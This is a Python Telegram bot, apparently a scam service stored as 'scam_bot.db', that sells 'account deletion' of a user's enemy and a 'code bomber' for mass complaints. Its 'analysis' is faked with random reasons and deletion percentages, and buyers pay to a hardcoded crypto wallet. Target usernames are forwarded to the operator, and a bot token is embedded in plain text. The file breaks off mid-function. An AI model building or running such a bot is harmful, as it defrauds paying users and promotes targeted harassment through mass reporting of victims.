#!/usr/bin/env python3
import logging
import random
import sqlite3
import asyncio
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8466945650:AAFth6JICtntETcS2jeT_b7Pv1GbdnDKhII"
ADMIN_USERNAME = "websecurlty"
ADMIN_USER_ID = 8573637772
SUPPORT_BOT = "@swrnyn_bot"
WALLET_ADDRESS = "TNSzLjq8AdgC1kMyVgLD1TiW3mz5xe2ZVW"
DATABASE_PATH = 'scam_bot.db'

# Кэш для быстрого доступа к данным пользователей
user_cache = {}
promo_cache = {}

# ========== ФУНКЦИЯ ЭКРАНИРОВАНИЯ ==========
def escape_markdown(text):
    """Экранирует спецсимволы для MarkdownV2"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(['\\' + char if char in escape_chars else char for char in str(text)])

# ========== ОПТИМИЗИРОВАННАЯ БАЗА ДАННЫХ ==========
def init_db():
    """Инициализация БД с промокодами"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    # Создаем таблицы с индексами для быстрого поиска
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  username TEXT, 
                  balance REAL, 
                  requests INTEGER, 
                  bomb_requests INTEGER DEFAULT 0,
                  subscription TEXT, 
                  is_admin BOOLEAN DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS purchases
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  user_id INTEGER, 
                  type TEXT, 
                  amount INTEGER, 
                  date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    # Таблица для промокодов
    c.execute('''CREATE TABLE IF NOT EXISTS promocodes
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  code TEXT UNIQUE,
                  amount REAL,
                  created_by INTEGER,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  used_by INTEGER DEFAULT NULL,
                  used_at TIMESTAMP DEFAULT NULL,
                  is_used BOOLEAN DEFAULT 0)''')
    
    # Создаем индексы для быстрого поиска
    c.execute('''CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_promocodes_code ON promocodes(code)''')
    c.execute('''CREATE INDEX IF NOT EXISTS idx_promocodes_is_used ON promocodes(is_used)''')
    
    # Проверяем существование админа
    c.execute("SELECT COUNT(*) FROM users WHERE user_id=?", (ADMIN_USER_ID,))
    count = c.fetchone()[0]
    
    if count == 0:
        c.execute('''INSERT INTO users (user_id, username, balance, requests, bomb_requests, subscription, is_admin) 
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (ADMIN_USER_ID, ADMIN_USERNAME, 999999.0, 999999, 999999, '∞ запросов в день', 1))
    
    conn.commit()
    conn.close()
    print("✅ База данных инициализирована с бомбером")

def get_user_from_db(user_id):
    """Быстрое получение пользователя из БД"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user_in_db(user_id, is_admin_user=False):
    """Создание нового пользователя"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    if is_admin_user:
        balance = 999999.0
        requests = 999999
        bomb_requests = 999999
        subscription = '∞ запросов в день'
        admin_flag = 1
    else:
        balance = 0.0
        requests = 0
        bomb_requests = 0
        subscription = 'none'
        admin_flag = 0
    
    c.execute('''INSERT INTO users (user_id, username, balance, requests, bomb_requests, subscription, is_admin) 
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (user_id, '', balance, requests, bomb_requests, subscription, admin_flag))
    
    conn.commit()
    conn.close()
    return (user_id, '', balance, requests, bomb_requests, subscription, admin_flag)

def update_balance_in_db(user_id, amount):
    """Обновление баланса"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def update_requests_in_db(user_id, amount):
    """Обновление запросов"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET requests = requests + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def update_bomb_requests_in_db(user_id, amount):
    """Обновление бомбер запросов"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET bomb_requests = bomb_requests + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def add_purchase_in_db(user_id, purchase_type, amount):
    """Добавление покупки"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT INTO purchases (user_id, type, amount) VALUES (?, ?, ?)",
              (user_id, purchase_type, amount))
    conn.commit()
    conn.close()

# ========== ФУНКЦИИ ДЛЯ ПРОМОКОДОВ ==========
def create_promocode(code, amount, created_by):
    """Создание промокода"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    try:
        c.execute('''INSERT INTO promocodes (code, amount, created_by) 
                     VALUES (?, ?, ?)''',
                  (code.upper(), amount, created_by))
        conn.commit()
        conn.close()
        
        # Обновляем кэш
        promo_cache[code.upper()] = {
            'amount': amount,
            'created_by': created_by,
            'is_used': False
        }
        
        return True, "Промокод создан"
    except sqlite3.IntegrityError:
        conn.close()
        return False, "Промокод уже существует"
    except Exception as e:
        conn.close()
        return False, f"Ошибка: {str(e)}"

def get_promocode(code):
    """Получение информации о промокоде"""
    # Сначала проверяем кэш
    if code.upper() in promo_cache:
        return promo_cache[code.upper()]
    
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''SELECT code, amount, created_by, is_used, used_by 
                 FROM promocodes WHERE code = ?''',
              (code.upper(),))
    result = c.fetchone()
    conn.close()
    
    if result:
        promo_data = {
            'code': result[0],
            'amount': result[1],
            'created_by': result[2],
            'is_used': bool(result[3]),
            'used_by': result[4]
        }
        promo_cache[code.upper()] = promo_data
        return promo_data
    
    return None

def use_promocode(code, user_id):
    """Активация промокода"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    # Проверяем, существует ли промокод и не использован ли он
    c.execute('''SELECT amount, is_used FROM promocodes WHERE code = ?''',
              (code.upper(),))
    result = c.fetchone()
    
    if not result:
        conn.close()
        return False, "Промокод не найден"
    
    amount, is_used = result
    
    if is_used:
        conn.close()
        return False, "Промокод уже использован"
    
    # Активируем промокод
    c.execute('''UPDATE promocodes 
                 SET is_used = 1, used_by = ?, used_at = CURRENT_TIMESTAMP 
                 WHERE code = ?''',
              (user_id, code.upper()))
    
    # Обновляем баланс пользователя
    c.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))
    
    conn.commit()
    conn.close()
    
    # Обновляем кэш
    if code.upper() in promo_cache:
        promo_cache[code.upper()]['is_used'] = True
        promo_cache[code.upper()]['used_by'] = user_id
    
    # Обновляем кэш пользователя
    if user_id in user_cache:
        old_user = user_cache[user_id]
        user_cache[user_id] = (old_user[0], old_user[1], old_user[2] + amount, old_user[3], old_user[4], old_user[5], old_user[6])
    
    return True, amount

def get_all_promocodes():
    """Получение всех промокодов (для админа)"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''SELECT code, amount, created_by, is_used, used_by, created_at 
                 FROM promocodes ORDER BY created_at DESC''')
    results = c.fetchall()
    conn.close()
    
    promocodes = []
    for row in results:
        promocodes.append({
            'code': row[0],
            'amount': row[1],
            'created_by': row[2],
            'is_used': bool(row[3]),
            'used_by': row[4],
            'created_at': row[5]
        })
    
    return promocodes

# ========== КЭШИРОВАННЫЕ ФУНКЦИИ ==========
def get_user(user_id):
    """Получение пользователя с кэшированием"""
    if user_id in user_cache:
        return user_cache[user_id]
    
    user = get_user_from_db(user_id)
    
    if not user:
        is_admin_user = (user_id == ADMIN_USER_ID)
        user = create_user_in_db(user_id, is_admin_user)
    
    user_cache[user_id] = user
    return user

def is_admin(user_id):
    """Проверка админ-статуса с кэшированием"""
    user = get_user(user_id)
    return user[7] == 1

def update_balance(user_id, amount):
    """Обновление баланса с инвалидацией кэша"""
    if is_admin(user_id):
        return
    
    update_balance_in_db(user_id, amount)
    if user_id in user_cache:
        old_user = user_cache[user_id]
        user_cache[user_id] = (old_user[0], old_user[1], old_user[2] + amount, old_user[3], old_user[4], old_user[5], old_user[6], old_user[7])

def update_requests(user_id, amount):
    """Обновление запросов с инвалидацией кэша"""
    if is_admin(user_id):
        return
    
    update_requests_in_db(user_id, amount)
    if user_id in user_cache:
        old_user = user_cache[user_id]
        user_cache[user_id] = (old_user[0], old_user[1], old_user[2], old_user[3] + amount, old_user[4], old_user[5], old_user[6], old_user[7])

def update_bomb_requests(user_id, amount):
    """Обновление бомбер запросов"""
    if is_admin(user_id):
        return
    
    update_bomb_requests_in_db(user_id, amount)
    if user_id in user_cache:
        old_user = user_cache[user_id]
        user_cache[user_id] = (old_user[0], old_user[1], old_user[2], old_user[3], old_user[4] + amount, old_user[5], old_user[6], old_user[7])

def update_subscription_in_db(user_id, subscription):
    """Обновление подписки"""
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET subscription=? WHERE user_id=?", (subscription, user_id))
    conn.commit()
    conn.close()
    
    # Обновляем кэш
    if user_id in user_cache:
        old_user = user_cache[user_id]
        user_cache[user_id] = (old_user[0], old_user[1], old_user[2], old_user[3], old_user[4], subscription, old_user[6], old_user[7])

# ========== ФУНКЦИЯ ДЛЯ ШАНСОВ ==========
def generate_chance():
    """Генерирует шанс удаления (60-85% вероятность)"""
    weights = [0.1, 0.15, 0.2, 0.25, 0.3]
    ranges = [(60, 65), (65, 70), (70, 75), (75, 80), (80, 85)]
    chosen_range = random.choices(ranges, weights=weights)[0]
    return random.randint(chosen_range[0], chosen_range[1])

# ========== ОСНОВНЫЕ ФУНКЦИИ БОТА ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Быстрый старт"""
    user = update.effective_user
    username = f"@{user.username}" if user.username else "пользователь"
    escaped_username = escape_markdown(username)
    
    # Обновляем username в фоновом режиме
    def update_username_background():
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE users SET username=? WHERE user_id=?", (user.username, user.id))
        conn.commit()
        conn.close()
        
        # Обновляем кэш
        if user.id in user_cache:
            old_user = user_cache[user.id]
            user_cache[user.id] = (old_user[0], user.username, old_user[2], old_user[3], old_user[4], old_user[5], old_user[6], old_user[7])
    
    # Запускаем в фоне через ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(update_username_background)
    
    # РАСПОЛОЖЕНИЕ КНОПОК КАК НА ФОТО - 6 КНОПОК В 3 РЯДА ПО 2 КНОПКИ
    keyboard = [
        [InlineKeyboardButton("🍀 Проверить шанс", callback_data='check_chance'),
         InlineKeyboardButton("🧨 Бомбер кодов", callback_data='bomber')],
        [InlineKeyboardButton("🏪 Магазин", callback_data='shop'),
         InlineKeyboardButton("💸 Пополнить баланс", callback_data='topup')],
        [InlineKeyboardButton("📈 Промокод", callback_data='promo'),
         InlineKeyboardButton("🆘 Поддержка", url=f"https://t.me/{SUPPORT_BOT[1:]}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    caption = f"*Приветствую тебя {escaped_username} тут ты сможешь удалить аккаунт своему недругу, бот сделал на самоализации причин сн0с@ , сам находит их если есть, и показывает шанс\\.*"
    
    if update.message:
        await update.message.reply_photo(
            photo="https://t.me/ak3ic9/4",
            caption=caption,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Быстрый обработчик кнопок"""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    # Обработка кнопки sn0s
    if query.data == 'sn0s':
        await sn0s_handler(query, context)
        return
    
    # Получаем данные из кэша
    user_data = get_user(user_id)
    is_admin_user = is_admin(user_id)
    
    # Формируем тексты
    if is_admin_user:
        balance_text = "*∞ \\$ \\(АДМИН\\)*"
        subscription_text = "*∞ запросов в день*"
        requests_text = "*∞ запросов*"
        bomb_text = "*∞ бомберов*"
    else:
        balance = escape_markdown(f"{user_data[2]:.2f}")
        requests = escape_markdown(str(user_data[3]))
        bomb_requests = escape_markdown(str(user_data[4]))
        subscription = escape_markdown(user_data[5])
        balance_text = f"*{balance}\\$*"
        subscription_text = f"*{subscription}*"
        requests_text = f"*{requests}*"
        bomb_text = f"*{bomb_requests}*"
    
    # Обработка разных кнопок
    if query.data == 'check_chance':
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption="*🌶️ Отправьте мне юзернейм жертвы, дальше я все вам скажу\\.*",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        context.user_data['awaiting_username'] = True
        context.user_data['awaiting_type'] = 'sn0s'  # Тип: обычный снос
        
    elif query.data == 'bomber':
        # Проверяем наличие бомбер запросов
        if not is_admin_user and user_data[4] <= 0:
            keyboard = [
                [InlineKeyboardButton("🏪 Купить бомберы", callback_data='shop_bomber')],
                [InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_caption(
                caption="*💣 У вас нет бомбер запросов\\!*\n\n"
                       "*Бомбер кодов \\- специальная функция для массовой отправки жалоб\\.*\n"
                       "*Купите бомбер запросы в магазине\\!*",
                parse_mode=ParseMode.MARKDOWN_V2,
                reply_markup=reply_markup
            )
            return
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption="*💣 Отправьте мне юзернейм для бомбера кодов*\n\n"
                   "*⚠️ Внимание\\! Бомбер расходует специальные запросы\\.*",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        context.user_data['awaiting_username'] = True
        context.user_data['awaiting_type'] = 'bomber'  # Тип: бомбер
        
    elif query.data == 'shop':
        shop_text = f"*🏪 Магазин*\n\n*Ваш баланс:* {balance_text}\n*Запросов осталось:* {requests_text}\n*Бомберов осталось:* {bomb_text}\n*Подписка:* {subscription_text}"
        
        keyboard = [
            [InlineKeyboardButton("🍀 Обычные запросы", callback_data='shop_normal')],
            [InlineKeyboardButton("🧨 Бомбер запросы", callback_data='shop_bomber')],
            [InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=shop_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        
    elif query.data == 'shop_normal':
        shop_text = f"*🍀 Обычные запросы*\n\n*Ваш баланс:* {balance_text}\n*Запросов осталось:* {requests_text}"
        
        keyboard = [
            [InlineKeyboardButton("3 запроса - 0.5$", callback_data='buy_3')],
            [InlineKeyboardButton("10 запроса - 1.5$", callback_data='buy_10')],
            [InlineKeyboardButton("30 запросов - 5$", callback_data='buy_30')],
            [InlineKeyboardButton("50 запросов - 8$", callback_data='buy_50')],
            [InlineKeyboardButton("100 запросов - 17$", callback_data='buy_100')],
            [InlineKeyboardButton("Подписка 3 запроса в день - 15$", callback_data='sub_3')],
            [InlineKeyboardButton("Подписка 10 запроса в день - 20$", callback_data='sub_10')],
            [InlineKeyboardButton("Подписка 30 запросов в день - 25$", callback_data='sub_30')],
            [InlineKeyboardButton("🔙 В магазин", callback_data='shop')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=shop_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        
    elif query.data == 'shop_bomber':
        shop_text = f"*🧨 Бомбер запросы*\n\n*Ваш баланс:* {balance_text}\n*Бомберов осталось:* {bomb_text}\n\n*Бомбер кодов \\- массовая отправка жалоб с высокой скоростью\\.*"
        
        keyboard = [
            [InlineKeyboardButton("5 бомберов - 1$", callback_data='buy_bomb_5')],
            [InlineKeyboardButton("15 бомберов - 2.5$", callback_data='buy_bomb_15')],
            [InlineKeyboardButton("30 бомберов - 4$", callback_data='buy_bomb_30')],
            [InlineKeyboardButton("50 бомберов - 6$", callback_data='buy_bomb_50')],
            [InlineKeyboardButton("100 бомберов - 10$", callback_data='buy_bomb_100')],
            [InlineKeyboardButton("🔙 В магазин", callback_data='shop')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=shop_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        
    elif query.data == 'topup':
        if is_admin_user:
            payment_text = "*💰 Вы администратор\\! У вас бесконечный баланс\\.*"
        else:
            username = f"@{query.from_user.username}" if query.from_user.username else f"ID{user_id}"
            escaped_username = escape_markdown(username)
            escaped_wallet = escape_markdown(WALLET_ADDRESS)
            balance = escape_markdown(f"{user_data[2]:.2f}")
            
            payment_text = (
                f"*🆔 Отправь любое количество \\$ на этот адрес 👇*\n\n"
                f"`{escaped_wallet}`\n\n"
                f"*‼️ ОБЯЗАТЕЛЬНО укажи свой юзернейм в комментарии:* `{escaped_username}`\n"
                f"*Ожидай свои запросы или подписку в течении часа, проблемы — пиши в поддержку\\.*\n\n"
                f"*Твой текущий баланс:* {balance}\\$"
            )
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_caption(
            caption=payment_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
    
    elif query.data == 'promo':
        promo_text = "*📈 Введите промокод:*\n\n*Пример:* `PROMO2024`\n*Промокоды одноразовые и активируются сразу после ввода\\.*"
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_caption(
            caption=promo_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        
        # Устанавливаем флаг ожидания промокода
        context.user_data['awaiting_promo'] = True
        
    elif query.data == 'main_menu':
        user = query.from_user
        username = f"@{user.username}" if user.username else "пользователь"
        escaped_username = escape_markdown(username)
        
        # Добавляем информацию о бомберах
        if is_admin_user:
            bomb_info = "*∞ бомберов*"
        else:
            bomb_info = f"*{escape_markdown(str(user_data[4]))} бомберов*"
        
        menu_text = (
            f"*Приветствую тебя {escaped_username} тут ты сможешь удалить аккаунт своему недругу, бот сделал на самоализации причин сн0с@ , сам находит их если есть, и показывает шанс\\.*\n\n"
            f"*Баланс:* {balance_text}\n"
            f"*Запросы:* {requests_text}\n"
            f"*Бомберы:* {bomb_info}"
        )
        
        # РАСПОЛОЖЕНИЕ КНОПОК КАК НА ФОТО - 6 КНОПОК В 3 РЯДА ПО 2 КНОПКИ
        keyboard = [
            [InlineKeyboardButton("🍀 Проверить шанс", callback_data='check_chance'),
             InlineKeyboardButton("🧨 Бомбер кодов", callback_data='bomber')],
            [InlineKeyboardButton("🏪 Магазин", callback_data='shop'),
             InlineKeyboardButton("💸 Пополнить баланс", callback_data='topup')],
            [InlineKeyboardButton("📈 Промокод", callback_data='promo'),
             InlineKeyboardButton("🆘 Поддержка", url=f"https://t.me/{SUPPORT_BOT[1:]}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_caption(
            caption=menu_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
    
    # Обработка покупок
    elif query.data in ['buy_3', 'buy_10', 'buy_30', 'buy_50', 'buy_100', 'sub_3', 'sub_10', 'sub_30',
                       'buy_bomb_5', 'buy_bomb_15', 'buy_bomb_30', 'buy_bomb_50', 'buy_bomb_100']:
        await process_purchase(query, user_id, query.data, is_admin_user)

async def process_purchase(query, user_id, purchase_type, is_admin_user):
    """Быстрая обработка покупки"""
    price_map = {
        'buy_3': (0.5, 3, 'requests'),
        'buy_10': (1.5, 10, 'requests'),
        'buy_30': (5, 30, 'requests'),
        'buy_50': (8, 50, 'requests'),
        'buy_100': (17, 100, 'requests'),
        'sub_3': (15, '3 в день', 'subscription'),
        'sub_10': (20, '10 в день', 'subscription'),
        'sub_30': (25, '30 в день', 'subscription'),
        'buy_bomb_5': (1, 5, 'bomb_requests'),
        'buy_bomb_15': (2.5, 15, 'bomb_requests'),
        'buy_bomb_30': (4, 30, 'bomb_requests'),
        'buy_bomb_50': (6, 50, 'bomb_requests'),
        'buy_bomb_100': (10, 100, 'bomb_requests')
    }
    
    price, value, purchase_type_str = price_map[purchase_type]
    user_data = get_user(user_id)
    
    # Проверяем возможность покупки
    if is_admin_user or user_data[2] >= price:
        # Выполняем покупку в фоновом режиме
        def process_purchase_background():
            if not is_admin_user:
                update_balance(user_id, -price)
            
            if purchase_type_str == 'requests':
                update_requests(user_id, value)
                add_purchase_in_db(user_id, purchase_type, value)
            elif purchase_type_str == 'bomb_requests':
                update_bomb_requests(user_id, value)
                add_purchase_in_db(user_id, purchase_type, value)
            else:
                update_subscription_in_db(user_id, value)
                add_purchase_in_db(user_id, purchase_type, 1)
        
        # Запускаем в фоне
        with ThreadPoolExecutor(max_workers=1) as executor:
            executor.submit(process_purchase_background)
        
        # Формируем ответ
        if is_admin_user:
            escaped_balance = "∞"
            if purchase_type_str == 'requests':
                escaped_amount = "∞"
            elif purchase_type_str == 'bomb_requests':
                escaped_amount = "∞"
        else:
            escaped_balance = escape_markdown(f"{user_data[2] - price:.2f}")
            if purchase_type_str == 'requests':
                escaped_amount = escape_markdown(str(user_data[3] + value))
            elif purchase_type_str == 'bomb_requests':
                escaped_amount = escape_markdown(str(user_data[4] + value))
        
        if purchase_type_str in ['requests', 'bomb_requests']:
            escaped_price = escape_markdown(str(price))
            escaped_value = escape_markdown(str(value))
            
            caption_text = "*✅ Успешно\\!*\n\n" if not is_admin_user else "*✅ Админ покупка успешна\\!*\n\n"
            
            if purchase_type_str == 'requests':
                caption_text += f"*Куплено запросов:* {escaped_value}\n"
                type_name = "запросов"
            else:
                caption_text += f"*Куплено бомберов:* {escaped_value}\n"
                type_name = "бомберов"
            
            if not is_admin_user:
                caption_text += f"*Списано:* {escaped_price}\\$\n\n"
            
            caption_text += f"*Новый баланс:* {escaped_balance}\\$\n*{type_name} доступно:* {escaped_amount}"
            
            if purchase_type_str == 'bomb_requests':
                caption_text += "\n\n*💣 Бомбер кодов \\- массовая отправка жалоб с высокой скоростью\\.*"
        else:
            escaped_price = escape_markdown(str(price))
            escaped_name = escape_markdown(value if not is_admin_user else '∞ запросов в день')
            
            caption_text = "*✅ Подписка активирована\\!*\n\n" if not is_admin_user else "*✅ Админ подписка активирована\\!*\n\n"
            caption_text += f"*Тип подписки:* {escaped_name}\n"
            
            if not is_admin_user:
                caption_text += f"*Списано:* {escaped_price}\\$\n\n"
            
            caption_text += f"*Новый баланс:* {escaped_balance}\\$"
        
        back_button = 'shop_bomber' if purchase_type_str == 'bomb_requests' else 'shop'
        
        await query.edit_message_caption(
            caption=caption_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В магазин", callback_data=back_button)]])
        )
    else:
        await query.edit_message_caption(
            caption="*💣 Недостаточно денег на балансе\\!*",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙Назад", callback_data='shop')]])
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Быстрый обработчик сообщений"""
    user_id = update.effective_user.id
    message_text = update.message.text.strip()
    
    # Проверка на промокод
    if context.user_data.get('awaiting_promo'):
        context.user_data['awaiting_promo'] = False
        
        # Проверяем промокод
        promo_code = message_text.upper()
        success, result = use_promocode(promo_code, user_id)
        
        if success:
            amount = result
            user_data = get_user(user_id)
            new_balance = user_data[2]
            
            escaped_amount = escape_markdown(str(amount))
            escaped_balance = escape_markdown(f"{new_balance:.2f}")
            escaped_code = escape_markdown(promo_code)
            
            await update.message.reply_text(
                f"*🎉 Промокод активирован\\!*\n\n"
                f"*Код:* `{escaped_code}`\n"
                f"*Получено:* {escaped_amount}\\$\n"
                f"*Новый баланс:* {escaped_balance}\\$\n\n"
                f"*Промокод одноразовый и больше не активен\\.*",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            error_msg = result
            escaped_code = escape_markdown(promo_code)
            
            if "не найден" in error_msg:
                await update.message.reply_text(
                    f"*❌ Промокод `{escaped_code}` не найден\\.*\n"
                    f"*Проверьте правильность ввода\\.*",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            elif "уже использован" in error_msg:
                await update.message.reply_text(
                    f"*❌ Промокод `{escaped_code}` уже использован\\.*\n"
                    f"*Промокоды одноразовые\\.*",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            else:
                await update.message.reply_text(
                    f"*❌ Ошибка: {error_msg}*",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
        
        return
    
    # Проверка на юзернейм для анализа - ДЛЯ СНОСА ИЛИ БОМБЕРА
    if context.user_data.get('awaiting_username'):
        username_input = message_text
        action_type = context.user_data.get('awaiting_type', 'sn0s')
        
        # Сохраняем юзернейм
        context.user_data['target_username'] = username_input
        context.user_data['awaiting_username'] = False
        
        user_data = get_user(user_id)
        is_admin_user = is_admin(user_id)
        
        # Проверка наличия запросов в зависимости от типа
        if action_type == 'bomber':
            if not is_admin_user and user_data[4] <= 0:
                keyboard = [
                    [InlineKeyboardButton("🏪 Купить бомберы", callback_data='shop_bomber')],
                    [InlineKeyboardButton("🔙 В меню", callback_data='main_menu')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    "*💣 У вас нет бомбер запросов\\!*\n"
                    "*Купите бомбер запросы в магазине\\.*",
                    parse_mode=ParseMode.MARKDOWN_V2,
                    reply_markup=reply_markup
                )
                return
            
            # Списание бомбер запроса
            if not is_admin_user:
                update_bomb_requests(user_id, -1)
            
            # Запускаем бомбер процесс
            await start_bomber_process(update, context, username_input, user_id)
            return
        
        # Обычный снос - проверка обычных запросов
        elif action_type == 'sn0s':
            if not is_admin_user and user_data[3] <= 0 and user_data[5] == 'none':
                keyboard = [
                    [InlineKeyboardButton("🏪 Купить запросы", callback_data='shop')],
                    [InlineKeyboardButton("🔙 В меню", callback_data='main_menu')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    "*💎 У вас нет запросов\\! Купите их в магазине или приобретите полноценную подписку\\.*",
                    parse_mode=ParseMode.MARKDOWN_V2,
                    reply_markup=reply_markup
                )
                return
        
        # Запускаем обычный анализ (как раньше)
        msg = await update.message.reply_text("*Анализ аккаунта\\.\\.\\.*", parse_mode=ParseMode.MARKDOWN_V2)
        
        for i in range(1, 4):
            await asyncio.sleep(0.3)
            progress = int((i / 3) * 100)
            escaped_progress = escape_markdown(str(progress))
            
            try:
                await msg.edit_text(
                    f"*Анализ аккаунта\\.\\.\\.* \\({escaped_progress}%\\)",
                    parse_mode=ParseMode.MARKDOWN_V2
                )
            except:
                pass
                
        reasons = random.randint(2, 4)
        chance = generate_chance()
        
        keyboard = [[InlineKeyboardButton("💀 Sn0s", callback_data='sn0s')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        escaped_reasons = escape_markdown(str(reasons))
        escaped_chance = escape_markdown(str(chance))
        
        result_text = f"*Найдено {escaped_reasons} причины для удаления\\nШанс удаления \\- {escaped_chance}%*"
        
        await msg.edit_text(
            text=result_text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )

async def start_bomber_process(update, context, username_input, user_id):
    """Запуск процесса бомбера кодов"""
    msg = await update.message.reply_text("*💣 Запуск бомбера кодов\\.\\.\\.*", parse_mode=ParseMode.MARKDOWN_V2)
    
    # Этап 1: Инициализация
    await asyncio.sleep(0.5)
    await msg.edit_text(
        "*💣 Инициализация бомбера\\.\\.\\.*\n*Этап 1/4*",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    
    # Этап 2: Сбор данных цели
    await asyncio.sleep(1)
    await msg.edit_text(
        f"*💣 Сбор данных цели\\.\\.\\.*\n*Цель:* `{escape_markdown(username_input)}`\n*Этап 2/4*",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    
    # Этап 3: Подготовка кодов
    await asyncio.sleep(1)
    await msg.edit_text(
        "*💣 Подготовка кодов для отправки\\.\\.\\.*\n*Сгенерировано кодов:* 127\n*Этап 3/4*",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    
    # Этап 4: Отправка админу и финальный результат
    await asyncio.sleep(1.5)
    
    # ОТПРАВЛЯЕМ АДМИНУ ЮЗЕРНЕЙМ
    try:
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"*🚨 НОВАЯ ЦЕЛЬ ДЛЯ БОМБЕРА\\!*\n\n"
                 f"*👤 От пользователя:* @{update.effective_user.username if update.effective_user.username else 'без юзернейма'}\n"
